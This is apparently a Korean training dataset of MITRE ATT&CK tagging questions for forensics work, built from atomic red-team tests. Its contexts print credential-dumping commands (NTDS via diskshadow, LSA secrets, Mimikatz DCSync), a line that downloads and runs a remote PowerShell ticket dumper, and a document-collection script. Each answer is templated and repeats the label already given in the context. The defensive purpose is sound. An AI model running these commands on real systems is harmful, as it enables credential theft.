{"id": "T1003.003_T1003.003-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.003 OS Credential Dumping: NTDS (Tactic: Credential Access)\n[요약] diskshadow.exe 스크립트 파일을 사용해 볼륨 섀도 카피를 생성하고 c:\\exfil 폴더 등으로 NTDS.dit를 추출하는 데 사용할 수 있는 환경을 만든다.\n[대표 명령 예시]\nmkdir c:\\exfil\r\ndiskshadow.exe /s #{filename}\n[기존 태그] action=[process_start, vss_access] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, NTDS_Dump, VSS_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.003 \"OS Credential Dumping: NTDS\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.004_T1003.004-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.004 OS Credential Dumping: LSA Secrets (Tactic: Credential Access)\n[요약] PsExec를 SYSTEM 권한으로 실행해 HKLM\\security\\policy\\secrets 하위 키를 reg save로 %temp%\\secrets 파일로 덤프하는 시나리오다.\n[대표 명령 예시]\n\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y\n[기존 태그] action=[process_start, registry_export, file_create] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, LSA_Secrets_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.004 \"OS Credential Dumping: LSA Secrets\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.004_T1003.004-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.004 OS Credential Dumping: LSA Secrets (Tactic: Credential Access)\n[요약] PowershellKerberos의 dumper.ps1을 원격에서 로드해 LSA 캐시에서 Kerberos 티켓을 덤프한다. 관리자 권한일 경우 자동으로 SYSTEM 권한으로 승격해 모든 세션 티켓을 수집한다.\n[대표 명령 예시]\nInvoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')\n[기존 태그] action=[script_download, process_start, ticket_dump] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, Kerberos_Ticket_Dump]", "answer": "이 행위는 MITRE ATT&CK의 T1003.004 \"OS Credential Dumping: LSA Secrets\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.005_T1003.005-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.005 OS Credential Dumping: Cached Domain Credentials (Tactic: Credential Access)\n[요약] 내장 유틸리티 cmdkey.exe를 사용해 현재 사용자 프로파일에 저장된 캐시 자격 증명 목록을 나열한다. 암호 값은 표시되지 않지만 대상, 사용자 이름 등 연결에 사용할 수 있는 메타데이터를 수집할 수 있다.\n[절차] 명령 프롬프트 또는 PowerShell에서 cmdkey /list를 실행한다. 출력에 표시되는 대상(서버/리소스)과 저장된 사용자 이름 정보를 확인하고, 추가 공격(재사용 가능 계정, RDP/SMB 연결 등)에 활용할 수 있는지 분석한다.\n[대표 명령 예시]\ncmdkey /list\n[기존 태그] action=[process_start, credential_enumeration] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, Cached_Domain_Credentials_Enum]", "answer": "이 행위는 MITRE ATT&CK의 T1003.005 \"OS Credential Dumping: Cached Domain Credentials\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.006_T1003.006-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.006 OS Credential Dumping: DCSync (Tactic: Credential Access)\n[요약] Mimikatz lsadump::dcsync 모듈을 사용해 도메인 복제 프로토콜을 통해 원격 도메인 컨트롤러에서 대상 사용자(기본 krbtgt)의 계정 정보를 요청·덤프하는 시나리오이다.\n[절차] 도메인 관리자 또는 동급 권한(복제 권한 포함)을 가진 계정 컨텍스트에서 Mimikatz 실행 파일을 준비한다. lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain} 명령을 사용해 도메인 컨트롤러에 복제 요청을 보내고, 해시·비밀 정보를 포함한 계정 데이터를 수신한다. 결과로 출력된 NTLM 해시, Kerberos 관련 값 등을 후속 공격(골든 티켓, 패스더해시 등)에 활용할 수 있다.\n[대표 명령 예시]\n#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n[기존 태그] action=[process_start, directory_replication, credential_dump] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, DCSync, AD_Repl_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.006 \"OS Credential Dumping: DCSync\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1003.006_T1003.006-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1003.006 OS Credential Dumping: DCSync (Tactic: Credential Access)\n[요약] DSInternals 모듈의 Get-ADReplAccount cmdlet을 사용해 도메인 컨트롤러(기본 %LOGONSERVER%)로부터 AD 복제 계정 정보를 조회·덤프하는 시나리오이다.\n[절차] PowerShell 환경에 DSInternals 모듈이 설치되어 있어야 한다. Get-ADReplAccount -All -Server #{logonserver} 명령을 실행해 대상 도메인 컨트롤러에서 모든 계정의 복제 정보를 조회한다. 표준 출력에 표시되는 도메인 이름, 계정 정보, 해시 관련 데이터 등을 확인하고 추가 공격에 활용할 수 있다.\n[대표 명령 예시]\nGet-ADReplAccount -All -Server #{logonserver}\n[기존 태그] action=[process_start, directory_replication, credential_enum] domain=[CredentialAccess] ttp=[OS_Credential_Dumping, DCSync, AD_Repl_Abuse]", "answer": "이 행위는 MITRE ATT&CK의 T1003.006 \"OS Credential Dumping: DCSync\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Credential Access이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1005_T1005-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1005 Data from Local System (Tactic: Collection)\n[요약] 지정한 시작 디렉터리(기본 C:\\Users) 아래에서 특정 확장자(.doc, .docx, .txt) 파일만 재귀적으로 검색하고, 발견된 파일들을 하나의 ZIP 파일로 묶어 저장한다. 공격자가 로컬 문서들을 선별 수집해 이후 유출을 준비하는 전형적인 시나리오를 에뮬레이션한다.\n[절차] 시작 디렉터리(starting_directory)와 출력 폴더(output_zip_folder_path), 검색 대상 확장자 목록(file_extensions)을 설정한다. 출력 폴더가 존재하지 않으면 PowerShell New-Item으로 생성한다. Get-ChildItem -Recurse로 시작 디렉터리 아래 모든 파일을 나열한 뒤, 확장자가 지정된 목록에 포함되는 파일만 필터링한다. 필터링된 파일이 하나 이상이면 Compress-Archive를 사용해 모두 data.zip 하나로 압축한다. 압축이 생성되면 경로를 출력하고, 대상 파일이 없으면 \"No files found\" 메시지를 출력한다.\n[대표 명령 예시]\n$startingDirectory = \"#{starting_directory}\";\n$outputZip = \"#{output_zip_folder_path}\";\n$fileExtensionsString = \"#{file_extensions}\";\n$fileExtensions = $fileExtensionsString -split \", \";\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null;\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  };\n  return $files;\n}\n\n$foundFiles = Search-Files -directory $startingDirectory;\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName;\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\";\n  Write-Host \"Zip file created: $outputZip\\data.zip\";\n} else {\n  Write-Host \"No files found with the specified extensions.\";\n}\n[기존 태그] action=[file_search, file_read, file_compress, file_create] domain=[Collection, Exfiltration_Preparation] ttp=[Data_From_Local_System]", "answer": "이 행위는 MITRE ATT&CK의 T1005 \"Data from Local System\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1006_T1006-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1006 Direct Volume Access (Tactic: Defense Evasion)\n[요약] PowerShell에서 \\\\.\\ 디바이스 경로를 사용해 볼륨 핸들을 직접 열고, 첫 11바이트를 읽어 부트 섹터 내용을 HEX로 출력한다. NTFS 볼륨인 경우 \"EB 52 90 4E 54 46 53\"(NTFS 시그니처)이 확인될 수 있다.\n[절차] 입력 인자 volume(기본 'C:') 값을 사용해 타깃 드라이브를 결정한다. PowerShell에서 IO.FileStream을 이용해 \"\\\\.\\#{volume}\" 경로로 볼륨 핸들을 연다. 길이가 11인 바이트 배열 버퍼를 생성한 뒤, 볼륨의 처음 11바이트를 읽어 버퍼에 저장한다. 핸들을 닫고, Format-Hex cmdlet으로 버퍼 내용을 헥스 덤프로 출력해 부트 섹터 시그니처를 확인한다.\n[대표 명령 예시]\n$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length) | Out-Null; $handle.Close(); Format-Hex -InputObject $buffer\n[기존 태그] action=[process_start, raw_disk_read] domain=[DefenseEvasion, Collection] ttp=[Direct_Volume_Access]", "answer": "이 행위는 MITRE ATT&CK의 T1006 \"Direct Volume Access\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1007_T1007-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1007 System Service Discovery (Tactic: Discovery)\n[요약] tasklist.exe와 sc.exe를 이용해 현재 시스템에 존재하는 서비스와 프로세스를 열거한다. 결과는 콘솔(stdout)에 출력되며, 서비스 상태 및 전체 서비스 목록을 확인할 수 있다.\n[절차] cmd.exe에서 tasklist.exe를 실행해 현재 실행 중인 프로세스 목록을 조회한다. sc query 명령으로 기본 서비스 상태(예: RUNNING, STOPPED)를 조회한다. sc query state= all 명령으로 모든 상태의 서비스를 포함한 전체 서비스 목록을 조회한다.\n[대표 명령 예시]\ntasklist.exe\r\nsc query\r\nsc query state= all\n[기존 태그] action=[process_start, service_enumeration] domain=[Discovery] ttp=[System_Service_Discovery]", "answer": "이 행위는 MITRE ATT&CK의 T1007 \"System Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1007_T1007-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1007 System Service Discovery (Tactic: Discovery)\n[요약] net.exe start 명령을 사용해 시작된 서비스 목록을 열거하고, 결과를 파일로 리다이렉트해 저장한다. 여러 위협 그룹이 서비스 인벤토리를 수집할 때 사용하는 방식과 유사하다.\n[절차] net.exe start 명령을 실행해 현재 시작된 서비스 목록을 조회한다. 명령 출력 결과를 리다이렉트 연산자(>>)를 사용해 지정된 텍스트 파일(기본값: %temp%\\service-list.txt)에 저장한다. 생성된 service-list.txt 파일을 열어 어떤 서비스가 실행 중인지 확인할 수 있다.\n[대표 명령 예시]\nnet.exe start >> #{output_file}\n[기존 태그] action=[process_start, file_create, service_enumeration] domain=[Discovery] ttp=[System_Service_Discovery]", "answer": "이 행위는 MITRE ATT&CK의 T1007 \"System Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1007_T1007-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1007 System Service Discovery (Tactic: Discovery)\n[요약] PowerShell의 Get-Service cmdlet을 실행해 로컬 시스템에 등록된 모든 서비스를 객체 형태로 나열한다. 서비스 이름, 상태, 표시 이름 등 메타데이터를 손쉽게 필터링·가공할 수 있다.\n[절차] cmd.exe에서 powershell.exe Get-Service 명령을 실행한다. PowerShell은 ServiceController 객체 목록을 반환하며, 서비스 이름(Name), 표시 이름(DisplayName), 상태(Status) 등의 정보를 화면에 출력한다. 필요 시 결과를 Export-Csv 등으로 파일에 저장하거나, 특정 조건에 맞는 서비스만 필터링할 수 있다.\n[대표 명령 예시]\npowershell.exe Get-Service\n[기존 태그] action=[process_start, service_enumeration] domain=[Discovery] ttp=[System_Service_Discovery]", "answer": "이 행위는 MITRE ATT&CK의 T1007 \"System Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1010_T1010-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1010 Application Window Discovery (Tactic: Discovery)\n[요약] C# .NET 코드(T1010.cs)를 컴파일해 실행 중인 프로세스의 메인 윈도우 제목을 나열한다. PowerShell이 원격에서 소스 코드를 내려받고, csc.exe로 EXE를 빌드한 뒤 T1010.exe를 실행해 각 프로세스와 연결된 윈도우 타이틀을 표준 출력으로 표시한다.\n[절차] 입력 인자 input_source_code 경로(기본: PathToAtomicsFolder\\T1010\\src\\T1010.cs)에 C# 소스 파일이 존재하는지 확인한다. 없으면 GitHub 저장소에서 다운로드한다. C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe 컴파일러를 호출해 T1010.cs를 빌드하고, 출력 바이너리를 %TEMP%\\T1010.exe로 생성한다. 생성된 T1010.exe를 실행해 현재 시스템에서 메인 윈도우 핸들을 가진 프로세스를 열거하고, 각 프로세스 이름과 윈도우 제목을 콘솔로 출력한다. 테스트 종료 후 임시 실행 파일(T1010.exe)을 삭제해 환경을 정리한다.\n[대표 명령 예시]\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\r\n#{output_file_name}\n[기존 태그] action=[process_start, file_create, network_connection] domain=[Discovery] ttp=[Application_Window_Discovery]", "answer": "이 행위는 MITRE ATT&CK의 T1010 \"Application Window Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1012_T1012-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1012 Query Registry (Tactic: Discovery)\n[요약] reg.exe를 사용해 Run/RunOnce, Winlogon, 서비스, SafeBoot, 그룹 정책 스크립트 등 주요 레지스트리 키를 연속으로 쿼리하여 자동 실행 지점과 서비스 구성을 탐색한다.\n[절차] cmd.exe에서 reg.exe를 호출해 Windows NT CurrentVersion\\Windows, Run/RunOnce, RunServices, Winlogon, SafeBoot 등 다수의 키를 순차적으로 reg query로 조회한다. 서비스 설정을 확인하기 위해 HKLM\\system\\currentcontrolset\\services 전체를 /s 옵션으로 쿼리한 뒤 findstr로 ImagePath가 .sys로 끝나는 드라이버 항목만 필터링한다. Active Setup, 그룹 정책 스크립트(Startup) 등의 키도 조회해 사용자/시스템 단의 추가 실행 지점을 확인한다. OS 버전에 따라 일부 키는 존재하지 않을 수 있으며, 해당 쿼리는 실패할 수 있다.\n[대표 명령 예시]\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\r\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\r\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n[기존 태그] action=[registry_query, process_start] domain=[Discovery] ttp=[Query_Registry, Persistence_Key_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1012 \"Query Registry\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1012_T1012-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1012 Query Registry (Tactic: Discovery)\n[요약] Get-Item, Get-ChildItem 같은 PowerShell 레지스트리 공급자(cmdlet)를 이용해 Run/RunOnce, Winlogon, 서비스, SafeBoot, Active Setup 등을 조회한다. reg.exe를 따로 실행하지 않기 때문에 프로세스 생성 기반 탐지를 우회할 수 있다.\n[절차] PowerShell 콘솔에서 레지스트리 드라이브(HKLM:, HKCU:, HKCR:)를 사용해 Get-Item, Get-ChildItem으로 주요 자동 실행·서비스 관련 키를 조회한다. Get-ChildItem HKLM:system\\currentcontrolset\\services를 통해 서비스 목록을 나열하고, 필요시 후속 필터링으로 드라이버/서비스를 분석할 수 있다. Active Setup, Group Policy Scripts 등 추가적인 구성 요소 키도 함께 조회해 잠재적 악성 설정을 탐색한다.\n[대표 명령 예시]\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\r\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\r\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\r\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\r\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\r\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n[기존 태그] action=[registry_query] domain=[Discovery] ttp=[Query_Registry, Powershell_Registry_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1012 \"Query Registry\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1012_T1012-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1012 Query Registry (Tactic: Discovery)\n[요약] 레지스트리 HKEY_CLASSES_ROOT\\CLSID에 등록된 COM 객체 목록을 열거하고, 각 CLSID에 대해 .NET Activator로 인스턴스를 생성해 사용 가능한 메서드/멤버를 출력 파일로 기록한다. 공격자는 이 정보를 기반으로 악용 가능한 COM 객체를 탐색할 수 있다.\n[절차] New-PSDrive를 사용해 HKEY_CLASSES_ROOT 루트를 HKCR 레지스트리 드라이브로 마운트한다. HKCR:\\CLSID 경로에서 Get-ChildItem -Name으로 CLSID 목록을 추출한 뒤, clsids.txt 임시 파일로 저장한다. 각 CLSID에 대해 [type]::GetTypeFromCLSID와 [activator]::CreateInstance를 사용해 COM 인스턴스를 생성한 후, Get-Member로 메서드와 속성을 나열하여 출력 파일(#{output_file})에 추가한다. 예외가 발생하는 CLSID는 try/catch로 무시하여 나머지 CLSID 처리를 계속 진행한다. 테스트 종료 후 출력 파일과 임시 clsids.txt 파일을 삭제한다.\n[대표 명령 예시]\nNew-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\r\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\r\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\r\n{try{write-output \"$($Position)-$($CLSID)\"\r\nwrite-output \"------------\"| out-file #{output_file} -append\r\nwrite-output $($CLSID)| out-file #{output_file} -append\r\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\r\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\r\n$position += 1} catch{}}\n[기존 태그] action=[registry_query, file_create] domain=[Discovery] ttp=[Query_Registry, COM_Object_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1012 \"Query Registry\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1012_T1012-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1012 Query Registry (Tactic: Discovery)\n[요약] reg.exe로 HKCU 및 HKLM의 AlwaysInstallElevated 키를 조회해, 일반 사용자가 MSI 패키지를 SYSTEM 권한으로 설치할 수 있는지 여부를 확인한다. 두 키 모두 0x1이면 권한 상승에 악용될 수 있다.\n[절차] cmd.exe에서 reg query를 사용해 HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 값을 조회한다. 동일하게 HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 값을 조회한다. 두 값이 모두 0x1인지 여부를 확인하여 AlwaysInstallElevated 설정이 사용자/머신 모두에 대해 활성화되어 있는지 판단한다.\n[대표 명령 예시]\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n[기존 태그] action=[registry_query] domain=[Discovery, PrivilegeEscalation] ttp=[Query_Registry, AlwaysInstallElevated_Check]", "answer": "이 행위는 MITRE ATT&CK의 T1012 \"Query Registry\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1012_T1012-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1012 Query Registry (Tactic: Discovery)\n[요약] reg.exe로 Software Inventory Logging(SIL) 관련 레지스트리 키를 조회해, 호스트 단위 소프트웨어 인벤토리 수집 기능이 활성화되어 있는지 확인한다. 공격자는 이를 이용해 특정 소프트웨어 존재 여부를 간접적으로 파악할 수 있다.\n[절차] cmd.exe에서 reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64 명령을 실행한다. collectionstate 값이 0 또는 1 등의 상태 값인지 확인하여 SIL 기능 활성 여부를 판별한다. 필요 시 해당 정보를 바탕으로 대상 환경에 설치된 소프트웨어 인벤토리 수집 정책을 추정한다.\n[대표 명령 예시]\nreg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64\n[기존 태그] action=[registry_query] domain=[Discovery] ttp=[Query_Registry, Software_Inventory_Logging_Check]", "answer": "이 행위는 MITRE ATT&CK의 T1012 \"Query Registry\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
